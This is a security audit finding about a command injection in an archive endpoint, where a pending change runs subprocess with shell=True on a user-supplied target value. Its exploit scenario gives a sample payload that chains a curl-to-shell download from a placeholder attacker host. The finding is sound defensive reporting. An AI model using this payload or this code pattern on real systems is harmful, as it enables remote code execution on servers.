# Vuln 1: Command Injection in archive endpoint: `app.py:15`

- Severity: HIGH
- Category: Injection & Code Execution
- Confidence: 0.98
- Description: The pending change replaces `subprocess.run()` argument-list execution with a shell command string and enables `shell=True` while interpolating the user-controlled `target` value directly into the command. Because `target` comes from `request.json["target"]`, an authenticated caller can inject shell metacharacters such as `;`, `&&`, backticks, or `$()` and cause arbitrary commands to execute on the server under the application's privileges.
- Exploit Scenario: An attacker who has, steals, or guesses a valid `X-Ops-Token` can submit a payload like `{"target":"/srv/data; curl https://attacker.example/pwn.sh | sh"}`. The shell will execute the injected command after invoking `archive-job`, yielding remote code execution on the host.
- Recommendation: Do not invoke a shell for this operation. Pass the command as an argument list, for example `subprocess.run(["/usr/local/bin/archive-job", "--target", target], ...)`, and keep `shell=False`. If the target path must be constrained, validate it against an allowlist of approved directories before execution.
